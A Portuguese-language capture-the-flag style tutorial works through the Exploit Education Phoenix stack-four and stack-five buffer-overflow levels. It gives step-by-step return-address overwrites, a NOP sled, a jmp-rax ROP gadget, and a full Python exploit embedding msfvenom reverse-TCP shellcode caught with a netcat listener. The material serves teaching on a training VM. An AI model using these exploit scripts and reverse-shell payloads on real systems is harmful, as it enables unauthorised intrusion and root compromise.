Variáveis print dois   A região não é apagada, pois consumiria processamento a toa!
...         O valores ficam largados lá até uma nova função escrever por cima deles..
...         Por isso que, ao analisar a stack, as vezes vemos &quot;lixo&quot; aleatório
...         Eles pode ser ignorado pois nem está mais na stack
                          
rbp main  &lt;- RBP e RSP - O topo da stack
rip main                                
</code></pre>
<p>Em seguida, vamos restaurar o rbp de main <code>pop rbp</code> 
(remover o valor no topo da stack (ver acima por referencia), e coloca-lo no alvo: <strong>rbp</strong>)</p>
<pre><code class="language-x86asm">--- omitido ---
rip main      &lt;- RSP   (lembrando que RSP se ajusta automaticamente com push/pop)
...
... main
call print_dois
proxima instrução
... resto de main
ret de main   &lt;- RBP
</code></pre>
<p><strong>ret (return)</strong>
ret vai restaurar o EIP de main com um <code>pop rip</code></p>
<pre><code class="language-x86asm">...
...resto de main  &lt;- RSP
call print_dois
proxima instrução &lt;- RIP
... resto de main
ret da main       &lt;- RBP
</code></pre>
<p>Assim, o stack frame de main foi restaurado graças ao rbp e rip salvos ( o rip salvo é chamado de <strong>Saved Return Pointer (SRP)</strong> )</p>
<h1 id="-caso-você-tenha-viajado-o-que-você-precisa-saber"><a class="header" href="#-caso-você-tenha-viajado-o-que-você-precisa-saber">🌍 Caso você tenha viajado, o que você precisa saber</a></h1>
<p>Existem algumas variáveis especiais dentro do processador:</p>
<pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
RBP Base Pointer        -&gt; Aponta para a base da stack
RIP Instruction Pointer -&gt; Aponta para a instrução que está sendo executada 
</code></pre>
<p>O RIP e o RBP atuais são salvos na stack quando chamamos uma função, junto das outras variáveis:</p>
<pre><code class="language-x86asm">buffer[64]
uns int qualquer usado na função
....
rbp
rip
</code></pre>
<p>Se por um buffer overflow conseguimos alterar aqueles inteiros depois do buffer, como <code>changeme</code> nos exercícios anteriores, também conseguimos 
alterar o RIP salvo (<code>SRP</code>) e redirecionar a execução do programa!</p>
<h1 id="-exploit-1"><a class="header" href="#-exploit-1">🔥 Exploit</a></h1>
<h2 id="-analisar-o-programa"><a class="header" href="#-analisar-o-programa">🔬 Analisar o programa</a></h2>
<p>O programa contem 3 funções: <code>complete_level</code>, <code>start_level</code> e <code>main</code></p>
<p><code>main</code> printa a mensagem do começo do nível e chama start_level</p>
<p><code>complete_level</code> é a função que precisamos chamar</p>
<p><code>start_level</code> é onde a magica acontece: <code>gets()</code> (vulnerável) é chamada num <code>buffer[64]</code></p>
<h2 id="-o-compilador-adicionou-coisa"><a class="header" href="#-o-compilador-adicionou-coisa">⁉️ O compilador adicionou coisa???</a></h2>
<p>Se colocarmos somente um byte:</p>
<pre><code class="language-bash">$ ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
A
and will be returning to 0x40068d
</code></pre>
<p>A função normalmente retorna para 0x40068d !</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*80&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40068d
Segmentation fault
</code></pre>
<p>Nos colocamos mais de 64 bytes (80), e conseguimos dar overflow... mas o rip não mudou e mesmo assim teve seg fault.... QUE?!!!!</p>
<p>O compilador muitas vezes coloca coisas na stack por performance ou compatibilidade!</p>
<p>Alem disso, nos exemplos passados o valor que queremo mudar estava logo depois do buffer, agora tem pelo menos o RBP salvo no meio do caminho!
Então precisamos levar isso em consideração, não basta só olhar que o tamanho do buffer é 64 e colocar 64 bytes de <code>padding</code>!</p>
<p>Em aplicações mais complexas, essa diferença pode chegar a centenas de bytes.</p>
<p>Nos podemos encontrar essa diferença usando ferramentas como fuzzers ou geradores de padrão...</p>
<p>Como nosso exemplo é simples, podemos aumentar/diminuir manualmente ate encontrar o valor certo:</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*89&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x41
Segmentation fault

$ python -c &quot;print 'A'*88&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x400000
Segmentation fault
</code></pre>
<p>Isso quer dizer que apoś <strong>88</strong> bytes, temos o SRP :D</p>
<h2 id="-encontrar-endereço-de-complete_level"><a class="header" href="#-encontrar-endereço-de-complete_level">🏠 Encontrar endereço de complete_level</a></h2>
<p>Você se lembra como faz? Nos usamos no exercício passado....</p>
<blockquote>
<p>cof cof objdump -d cof cof</p>
</blockquote>
<pre><code>Se vc quer tentar sozinhx, agora é a sua hora
.
.
.
.
.
.
.
.
.
.
.
.
.
Eai, conseguiu?
</code></pre>
<p>Encontrar endereço:</p>
<pre><code class="language-x86asm">$ objdump -d stack-four | grep complete_level
000000000040061d &lt;complete_level&gt;:
</code></pre>
<p>Exploit:</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*88 + '\x1d\x06\x40'&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
</code></pre>
<p>Esse foi um tutorial beeem longo, e com certeza o mais difícil! Se você chegou até aqui, parabéns! :D</p>
<h1 id="-solução-4"><a class="header" href="#-solução-4">💫 Solução</a></h1>
<pre><code class="language-bash">$ python -c &quot;print 'A'*88 + '\x1d\x06\x40'&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/phoenix/StackFive.html#-objetivo">🎯 Objetivo</a></li>
<li><a href="stack/phoenix/StackFive.html#-dicas">💡 Dicas</a></li>
<li><a href="stack/phoenix/StackFive.html#-exploit">🔥 Exploit</a>
<ul>
<li><a href="stack/phoenix/StackFive.html#analisando-o-programa">Analisando o programa</a></li>
<li><a href="stack/phoenix/StackFive.html#agora-em-asm-d-analise-est%C3%A1tica">Agora em ASM :D (analise estática)</a>
<ul>
<li><a href="stack/phoenix/StackFive.html#breakpoint">Breakpoint</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackFive.html#agora-vamos-executar-o-programa-analise-din%C3%A2mica">Agora vamos executar o programa (analise dinâmica)</a></li>
<li><a href="stack/phoenix/StackFive.html#encontrar-endere%C3%A7o-do-buffer">Encontrar endereço do buffer</a></li>
<li><a href="stack/phoenix/StackFive.html#nop-sled">NOP sled</a></li>
<li><a href="stack/phoenix/StackFive.html#shellcode">Shellcode</a></li>
<li><a href="stack/phoenix/StackFive.html#corrigindo-o-problema">Corrigindo o problema</a>
<ul>
<li><a href="stack/phoenix/StackFive.html#rop-gadgets">ROP Gadgets</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="stack/phoenix/StackFive.html#-solu%C3%A7%C3%A3o">💫 Solução</a></li>
</ul>
<h1 id="-objetivo-4"><a class="header" href="#-objetivo-4">🎯 Objetivo</a></h1>
<p>Finalmente! Tudo isso para chegar no BOF SRP (clássico) :D</p>
<p>Agora ta na hora de redirecionar o pointer para o nosso código malicioso (shellcode) para ganhar uma shell </p>
<h1 id="-dicas-1"><a class="header" href="#-dicas-1">💡 Dicas</a></h1>
<p>A instrução <code>0xCC</code> (<code>int3</code>) serve para no debugger (como o gdb), para quando o rip chegar nela, a execução pausar (<code>breakpoint</code>). Nos podemos usa-la para testar se
sequer conseguimos executar código, ou se o problema ta no shellcode: Se o debugger avisa que teve <code>SIGTRAP</code>, nos temos execução de código :D</p>
<p>Banco de dados de shellcode: <a href="http://shell-storm.org/shellcode/files/">shell-storm</a></p>
<h1 id="-exploit-2"><a class="header" href="#-exploit-2">🔥 Exploit</a></h1>
<h2 id="analisando-o-programa"><a class="header" href="#analisando-o-programa">Analisando o programa</a></h2>
<p><code>main()</code> printa o banner e chama <code>start_level()</code></p>
<p><code>start_level()</code> cria um buffer[<strong>128</strong>] e salva o output de <code>gets()</code> (<strong>inseguro</strong>)</p>
<p>Como você pode ver, não existe <code>complete_level()</code></p>
<p>Para completar, precisamos executar nosso próprio código (<code>shellcode</code>) e conseguir uma shell (uma linha de comando)</p>
<h2 id="agora-em-asm-d-analise-estática"><a class="header" href="#agora-em-asm-d-analise-estática">Agora em ASM :D (analise estática)</a></h2>
<p>Normalmente, o gdb printa assim:</p>
<pre><code class="language-x86asm">   0x00000000004005a4 &lt;+0&gt;:	push   rbp
   0x00000000004005a5 &lt;+1&gt;:	mov    rbp,rsp
   0x00000000004005a8 &lt;+4&gt;:	sub    rsp,0x10
</code></pre>
<p>Porem, eu removi os endereços para simplificar, e só mantive os importantes!</p>
<p>Primeiro, vamos ver main</p>
<pre><code class="language-x86asm">gef&gt; disassemble main
push   rbp
mov    rbp,rsp                    &lt;- Prologo
sub    rsp,0x10
   
   
mov    DWORD PTR [rbp-0x4],edi
mov    QWORD PTR [rbp-0x10],rsi   &lt;- args de puts
mov    edi,0x400620
call   0x400400 &lt;puts@plt&gt;        &lt;- call puts
   
   
mov    eax,0x0                    &lt;- args de start_level (nenhum)
call   0x40058d &lt;start_level&gt;     &lt;- call start_level
   
   
mov    eax,0x0                    &lt;- exit code (código de saida, 0=sem erro)
leave                             &lt;- Epilogo  
</code></pre>
<p>Agora vamos ver start_level</p>
<pre><code class="language-x86asm">gef&gt; disassemble start_level 
push   rbp
mov    rbp,rsp                  &lt;- Prologo 
add    rsp,0xffffffffffffff80   
                                
   
lea    rax,[rbp-0x80]         &lt;- rax = Pointer para buffer[128]
mov    rdi,rax                &lt;- rdi = rax

0x000000000040059c &lt;+15&gt;:
call   0x4003f0 &lt;gets@plt&gt;    &lt;- call gets


nop
leave                         &lt;- Epilogo
ret
</code></pre>
<p>Agora vamos adicionar um breakpoint!</p>
<h3 id="breakpoint"><a class="header" href="#breakpoint">Breakpoint</a></h3>
<blockquote>
<p>Breakpoint = ponto de pausa</p>
</blockquote>
<p>Antes daquela intrusão ser executada, sera substituída por <code>0xCC</code>. Isso faz o  debugger pausar a execução do programa naquela instrução!</p>
<p>Quando continuamos executando (normalmente o comando é <strong>continue</strong>), o <code>0xCC</code> é substituído pela instrução certa :D</p>
<p>Se você esta fora de um debugger, <code>0xCC</code> vai fazer o programa sair com erro</p>
<pre><code class="language-x86asm">gef&gt; b *0x000000000040059c
Breakpoint 1 at 0x40059c
</code></pre>
<p>&quot;b&quot; é o comando do gdb para adicionar um breakpoint \ 
A &quot;*&quot; tem haver com aquele dos pointers \ 
O endereço é para &quot;<code>call gets</code>&quot;</p>
<blockquote>
<p>Dica: se você selecionar/sublinhar (clique esquerdo e passa o mouse em cima, você sabe do que eu to falando), e clicar o botão do meio no mouse (a rodinha) 
o terminal automaticamente da Ctrl-C Ctrl-V naquele valor para você! Então não precisa copiar o endereço manualmente :D</p>
</blockquote>
<h2 id="agora-vamos-executar-o-programa-analise-dinâmica"><a class="header" href="#agora-vamos-executar-o-programa-analise-dinâmica">Agora vamos executar o programa (analise dinâmica)</a></h2>
<p>126 As não causam erro, e 127 As causam... ue, mas pq? não era pra dar erro só em 128?</p>
<pre><code class="language-bash">$ python3 -c &quot;print('A'*126)&quot; | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education

$ python3 -c &quot;print('A'*127)&quot; | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Segmentation fault
</code></pre>
<p>Isso vai ser muito importante no próximo desafio: buffers são terminados com um null byte!</p>
<p>Por enquanto, isso só nos mostra que o compilador não adicionou nada no meio do caminho entre o buffer e o EBP+EIP Salvos :D</p>
<p>E nós ja sabemos como controlar o EIP, então agora só precisamos saber para onde redirecionar a execução :)</p>
<h2 id="encontrar-endereço-do-buffer"><a class="header" href="#encontrar-endereço-do-buffer">Encontrar endereço do buffer</a></h2>
<p>Agora dentro do gdb (<strong>gdb stack-five</strong>)</p>
<blockquote>
<p>gef&gt; r &lt;&lt;&lt; $(python3 -c &quot;print('A'*100)&quot;)</p>
<p>r é o comand do gdb para rodar o programa!
Adicionando &quot;&lt;&lt;&lt;&quot; nós podemos mandar uma string pro input! Também funciona com arquivos ( r &lt; nome_do_arquivo ) :D</p>
</blockquote>
<pre><code class="language-x86asm">gef&gt; r &lt;&lt;&lt; $(python3 -c &quot;print('A'*100)&quot;)
Starting program: /opt/phoenix/amd64/stack-five &lt;&lt;&lt; $(python3 -c &quot;print('A'*100)&quot;)
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x000000000040059c in start_level ()

--- Output do gef ---
</code></pre>
<blockquote>
<p>gef é uma extensão do gdb que vai te dar um monte de informação util quando você chegar num breakpoint</p>
</blockquote>
<p>O output do gef contem:
<img src="stack/phoenix/./img/gef_example.png" alt="" />
Porem, mais informações podem ser adicionadas! use <code>gef help</code> para ver como ele pode te ajudar :D </p>
<p>Caso o programa seja executado sem breakpoints e com muitos As, vamos receber uma SIGSEV informando que &quot;$PC&quot;(outro nome para RIP) não pode ser redirecionado para &quot;41414141&quot;, confirmando que o nosso buffer overflow é possível (olha as linhas no final da segunda imagem)
<img src="stack/phoenix/./img/stack_five/gef_A_overflow_0.png" alt="" />
<img src="stack/phoenix/./img/stack_five/gef_A_overflow_1.png" alt="" /></p>
<p>Agora, vamos colocar o breakpoint em <code>call gets()</code> e executar o programa com 140 As
<img src="stack/phoenix/./img/stack_five/before_gets_0.png" alt="" /></p>
<p>As partes importante no output do gef são:</p>
<p>registers
<img src="stack/phoenix/./img/stack_five/before_gets_3.png" alt="" /></p>
<p>argumentos (vazio: o pointer em RDI aponta para <strong>0x00007fffffffe5b0</strong>, que possui o valor 0x0000...,)
<img src="stack/phoenix/./img/stack_five/before_gets_1.png" alt="" /></p>
<blockquote>
<p>Lembrete de que pointer começa com 2 NULL bytes ai :D 0x<strong>0000</strong>7fff....</p>
</blockquote>
<p>stack
<img src="stack/phoenix/./img/stack_five/before_gets_2.png" alt="" /></p>
<p>Você também acha que tem uma falta de AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ?? hehehe :P</p>
<p>(((Insira aquele meme muito velho da cabra gritando)))</p>
<p>Então vamos avançar para próxima instrução (step: <code>s</code>) :D
<img src="stack/phoenix/./img/stack_five/gef_after_gets_0.png" alt="" /></p>
<p>Isso quer dizer que aquele pointer dos argumentos (RDI) agora aponta para os As! :D</p>
<pre><code class="language-x86asm">gef&gt; x/s 0x00007fffffffe5b0              -&gt; x/s é o comando para printar strings
0x7fffffffe5b0:	'A' &lt;repete 140 vezes&gt;
</code></pre>
<p>Então nos ja temos o endereço dos nossos As :D ... que em breve serão shellcode :D</p>
<p>Mas agora precisamos saber com precisão quantos As até o RIP, <code>info frame</code> vai nos ajudar com isso:</p>
<pre><code class="language-x86asm">gef&gt; info frame
Stack level 0, frame at 0x7fffffffe640:
 rip = 0x4005a1 in start_level  saved rip = 0x4005c7
 called by frame at 0x7fffffffe610
 Arglist at 0x7fffffffe630, args: 
 Locals at 0x7fffffffe630, Previous frame's sp is 0x7fffffffe640
 Saved registers:
  rbp at 0x7fffffffe630, rip at 0x7fffffffe638
</code></pre>
<p>A ultima linha é a mais importante!</p>
<p>RIP em: <code>0x7fffffffe638</code></p>
<p>Então para encontrar precisamente quantos As precisamos colocar até chegarmos no RIP,
basta subtrair <code>endereço do rip salvo - endereço dos As</code></p>
<pre><code class="language-x86asm">$ python3
&gt;&gt;&gt; 0x7fffffffe638 - 0x00007fffffffe5b0
136
</code></pre>
<p>Para confirmar isso, vamos rodar com 136 As + BBBB</p>
<p><img src="stack/phoenix/./img/stack_five/gef_136A_BBBB.png" alt="" /></p>
<p>RIP = BBBB (42424242) :D</p>
<h2 id="nop-sled"><a class="header" href="#nop-sled">NOP sled</a></h2>
<p>Entretanto, como nada pode ser simples nesse mundo do desenvolvimento de exploits, nós não conseguimos saber com precisão que o buffer vai estar naquela localização :(</p>
<p>Isso ocorre pois as envs são alocadas na stack. E elas variam muito, por exemplo, só de mudar o local de onde o programa esta sendo executado quebraria o nosso exploit.</p>
<blockquote>
<p>Dica: O gef pode nos ajudar a encontra-las
<img src="stack/phoenix/./img/stack_five/gef_envs_1.png" alt="" /></p>
</blockquote>
<p>Por exemplo:</p>
<p><img src="stack/phoenix/./img/stack_five/gef_envs_0.png" alt="" /></p>
<p>Para remediar isso, podemos usar um NOP sled (ou NOP slide) ! :D</p>
<p>(Outro método de remediação é mencionado em <code>stack-six</code>)</p>
<p>NOP significa &quot;<strong>No</strong> <strong>OP</strong>eration&quot; (<strong>N</strong>enhuma <strong>OP</strong>eração) ! é uma instrução que não faz nada :D</p>
<p>A representação em machine code do NOP é <code>0x90</code> :D Bem fácil de decorar, quem me dera escola fosse fácil assim hehehe :)</p>
<p>O processador vai fazer nada e passar para a próxima, e se nós colocarmos vários desses em sequencia, o RIP vai &quot;deslizando&quot; através até chegar no nosso código!</p>
<p>Você pode imaginar um escorregador :D yuuuuupiii</p>
<p><img src="stack/phoenix/./img/panda_slide_1.gif" alt="" /></p>
<p>Então a gente redireciona o RIP para o meio do escorregador de NOPs, para ele deslizar até o nosso código :D</p>
<p>Assim, mesmo se o buffer estiverem em um endereço diferente, o RIP vai chegar no nosso shellcode</p>
<p>Para testar isso, vamos usar o truque do <code>0xCC</code> mencionado anteriormente</p>
<p>O input que vai passar vai conter:</p>
<pre><code class="language-x86asm">NOP * 135
0xCC
Endereço para ser colocado no RIP: 0x00007fffffffe5b0 + 70

70 = metade do escorregador (135)
</code></pre>
<p>E os <strong>breakpoints do gdb serão removidos</strong>, então caso encontremos um breakpoint, foi o <code>0xCC</code> acima</p>
<pre><code class="language-x86asm">$ python3
&gt;&gt;&gt; hex(0x00007fffffffe5b0 + 70)
'0x7fffffffe5f6'                     - Little Endian -&gt; '\xb6\xe5\xff\xff\xff\x7f'
</code></pre>
<p>Agora executando:</p>
<pre><code class="language-x86asm">r &lt;&lt;&lt; $(python -c &quot;print '\x90' *135 + '\xcc' +'\xb6\xe5\xff\xff\xff\x7f'&quot;)
</code></pre>
<p>Nos recebemos uma SIGTRAP (chegou no breakpoint)</p>
<pre><code class="language-x86asm">[#0] Id 1, Name: &quot;stack-five&quot;, stopped, reason: SIGTRAP
</code></pre>
<p>E na seção <code>code</code> do gef
<img src="stack/phoenix/./img/stack_five/gef_run_xCC.png" alt="" />
Meio difícil de ver, mas tem:</p>
<pre><code class="language-x86asm">NOP
NOP
INT3
(bad)
(bad)
</code></pre>
<blockquote>
<p>int3 é o nome de 0xCC, da mesma maneira que NOP é o nome de 0x90 </p>
</blockquote>
<p>Apos a nossa ultima instrução ha instruções invalidas <code>(bad)</code> que eram o nosso pointer, e logo em seguida o resto do programa normal! :D</p>
<h2 id="shellcode"><a class="header" href="#shellcode">Shellcode</a></h2>
<p>Shellcode é o código malicioso que vai ser executado ( normalmente te dando uma shell (terminal) não autorizada )</p>
<p>Nos podemos usar os do link citado na dica, ou gerar uma usando <code>msfvenom</code> (ja vem instalado no kali linux)</p>
<blockquote>
<p>msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform linux -a x64 -f python --var-name buf</p>
</blockquote>
<pre><code>No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of python file: 373 bytes
buf =  b&quot;&quot;
buf += b&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += b&quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += b&quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += b&quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += b&quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += b&quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

</code></pre>
<p>Agora, vamos fazer um exploit mais bem feito! <code>vim /tmp/gerar_exploit.py</code></p>
<pre><code class="language-python">buf =  b&quot;&quot;

# shellcode
buf += b&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += b&quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += b&quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += b&quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += b&quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += b&quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# NOP Sled para completar o resto do tamanho
buf = '\x90'*(136-len(buf)) + buf

# ret
buf += b'\xb6\xe5\xff\xff\xff\x7f' 


open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<blockquote>
<p>O script /tmp/gerar_exploit.py vai gerar o que colocaríamos no input, mas ao invés de printarmos para o terminal, vamos salvar em um arquivo binário (por isso o &quot;<code>wb</code>&quot; no <code>open</code>)! </p>
<p>Depois é só ler esse arquivo e redireciona-lo <code>cat /tmp/exploit | ./stack-five</code> </p>
</blockquote>
<p>Porem, se tentamos executar esse exploit, recebemos <code>SIGSEV: violação de segmento</code></p>
<h2 id="corrigindo-o-problema"><a class="header" href="#corrigindo-o-problema">Corrigindo o problema</a></h2>
<p>Nessa eu empaquei, e a solução veio daqui: <a href="https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-five-solution/">blog lamarranet</a></p>
<p>Então valeu pela ajuda :D</p>
<p>Ao invés de colocar o endereço do buffer diretamente no RIP, vamos achar algo no programa original que aponte para ele: um <code>jmp esp</code> por exemplo</p>
<p>E o beneficio é que, por estarmos pulando para uma parte estática, e usando-a para redirecionar para o buffer, não corremos o risco do buffer mudar de endereço!</p>
<p>Isso quer dizer que não precisamos mais do NOP slide :D </p>
<h3 id="rop-gadgets"><a class="header" href="#rop-gadgets">ROP Gadgets</a></h3>
<p>Essa é uma técnica chamada programação <code>ROP</code>, que sera discutida em tutoriais futuros :D  Mas o que você precisa saber por enquanto é que cada um desses <code>jmps</code> é chamado de <strong>gadget</strong></p>
<p>Gadgets são instruções em outras partes do programa, que são reaproveitadas por nos. Geralmente executar algo e pular para outro gadget!</p>
<p>Para achar esse jmp que nos ajudaria, podemos usar uma ferramenta chamada <code>ROPgadget</code></p>
<pre><code class="language-x86asm">$ ROPgadget --binary stack-five --only &quot;jmp&quot;
Gadgets information
============================================================
0x0000000000400481 : jmp rax

Unique gadgets found: 1
</code></pre>
<p>Isso quer dizer que, ao pular para <code>0x400481</code>, vamos executar <code>jmp rax</code> e acabar pulando para rax! e para onde rax aponta?</p>
<p>Colocando um break antes do ret de <code>start_level</code>, podemos ver que antes de retornar, rax aponta para o mesmo endereço que rsp, e convenientemente o inicio do nosso buffer
<img src="stack/phoenix/./img/stack_five/gef_rax.png" alt="" /></p>
<p>rax,rdi e rsp apontam para o inicio do buffer dos As</p>
<p>Assim, não vamos mais precisar do NOP slide: temos um exploit que 100% dos casos vai apontar para o inicio do buffer!</p>
<p>Só precisamos colocar <code>padding</code> entre o shellcode e o RIP</p>
<p>Então vamos modificar o exploit :D</p>
<pre><code>Dica: Shellcode+AAAAA+ret, Little Endian, 136 bytes ate RIP

Se você não quiser ver a solução enquanto tenta!
.
.
.
.
.
.
.
.
.
.
.
</code></pre>
<pre><code class="language-python">buf =  &quot;&quot;

# shellcode
buf += &quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += &quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += &quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += &quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += &quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += &quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# Padding
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40' # Aponta para jmp rax

open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<blockquote>
<p>Eu removi o <strong>b&quot;&quot;</strong> pq tava dando problema :(</p>
</blockquote>
<p>Agora basta gerar o exploit: <code>python /tmp/gerar_exploit.py</code></p>
<p>Abrir um novo terminal: <code>ssh -p 2222 user@localhost</code></p>
<p>Terminal 1: <code>nc -lvnp 4444</code></p>
<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code> </p>
<p>Agora, no terminal 1 deve ter uma shell :D</p>
<p><img src="stack/phoenix/./img/stack_five/Exploit_working.png" alt="" /></p>
<blockquote>
<p>Dica: <code>bash -ip</code> vai deixar a sua shell mais usável</p>
</blockquote>
<p>Se nos tivéssemos executado o programa como root, a nossa shell teria esses privilégios elevados ! :D</p>
<p><img src="stack/phoenix/./img/stack_five/root_exploit.png" alt="" /></p>
<p><code>UID = 0</code> quer dizer que possuímos privilégios de root, mesmo que o <code>whoami</code> não tenha dito root</p>
<p>E se o programa estivesse exposto para a rede, poderíamos conseguir uma root shell remota :D (spoiler para os próximos desafios hehehe)</p>
<hr />
<p>Você chegou até aqui :D</p>
<p>Toma mais um gif de panda como presente</p>
<p><img src="stack/phoenix/./img/panda_slide_0.gif" alt="" /></p>
<h1 id="-solução-5"><a class="header" href="#-solução-5">💫 Solução</a></h1>
<blockquote>
<p>vim /tmp/gerar_exploit.py</p>
</blockquote>
<pre><code>buf =  &quot;&quot;

# shellcode
buf += &quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += &quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += &quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += &quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += &quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += &quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# Filler
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40' # Aponta para jmp rax

open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<p>Agora basta gerar o exploit: <code>python /tmp/gerar_exploit.py</code></p>
<p>Abrir um novo terminal: <code>ssh -p 2222 user@localhost</code></p>
<p>Terminal 1: <code>nc -lvnp 4444</code></p>
<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code> </p>
<p>Agora, no terminal 1 deve ter uma shell :D</p>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/phoenix/StackSix.html#-dicas">💡 Dicas</a></li>
<li><a href="stack/phoenix/StackSix.html#-explica%C3%A7%C3%A3o">🛸 Explicação</a>
<ul>
<li><a href="stack/phoenix/StackSix.html#analisando-o-programa">Analisando o programa</a>
<ul>
<li><a href="stack/phoenix/StackSix.html#main">main</a>
<ul>
<li><a href="stack/phoenix/StackSix.html#dica">Dica</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackSix.html#greet">greet</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackSix.html#analisando-o-programa-asm">Analisando o programa (ASM)</a>
<ul>
<li><a href="stack/phoenix/StackSix.html#main-1">main</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackSix.html#fuzz">Fuzz</a></li>
<li><a href="stack/phoenix/StackSix.html#e-vamos-rodar-com-127-as">E vamos rodar com 127 As:</a>
<ul>
<li><a href="stack/phoenix/StackSix.html#curiosidade">Curiosidade</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackSix.html#como-ir-de-off-by-one-para-execu%C3%A7%C3%A3o-de-c%C3%B3digo">Como ir de off-by-one para execução de código</a>
<ul>
<li><a href="stack/phoenix/StackSix.html#ret-com-um-rbp-corrompido">Ret com um RBP corrompido</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="stack/phoenix/StackSix.html#-exploit">🔥 Exploit</a>
<ul>
<li><a href="stack/phoenix/StackSix.html#o-que-controlamos">O que controlamos?</a>
<ul>
<li><a href="stack/phoenix/StackSix.html#setup">Setup</a></li>
<li><a href="stack/phoenix/StackSix.html#descobrir-que-partes-da-memoria-controlamos">Descobrir que partes da memoria controlamos</a></li>
<li><a href="stack/phoenix/StackSix.html#encontrar-para-que-regi%C3%A3o-podemos-apontar-rbp">Encontrar para que região podemos apontar rbp</a></li>
<li><a href="stack/phoenix/StackSix.html#encontrar-um-pointer-nessa-regi%C3%A3o-que-aponte-para-a-parte-que-controlamos">Encontrar um pointer nessa região que aponte para a parte que controlamos</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackSix.html#shellcode">Shellcode</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackSix.html#-solu%C3%A7%C3%A3o">💫 Solução</a></li>
</ul>
<h1 id="-dicas-2"><a class="header" href="#-dicas-2">💡 Dicas</a></h1>
<p>Off-by-one BOF</p>
<h1 id="-explicação-4"><a class="header" href="#-explicação-4">🛸 Explicação</a></h1>
<p>O programa aceita um nome por meio da env <code>ExploitEducation</code>! Esse nome é usado para gerar uma mensagem de boas vindas! \ 
Esse processo de gerar as mensagens é vulnerável a buffer overflow!</p>
<h2 id="analisando-o-programa-1"><a class="header" href="#analisando-o-programa-1">Analisando o programa</a></h2>
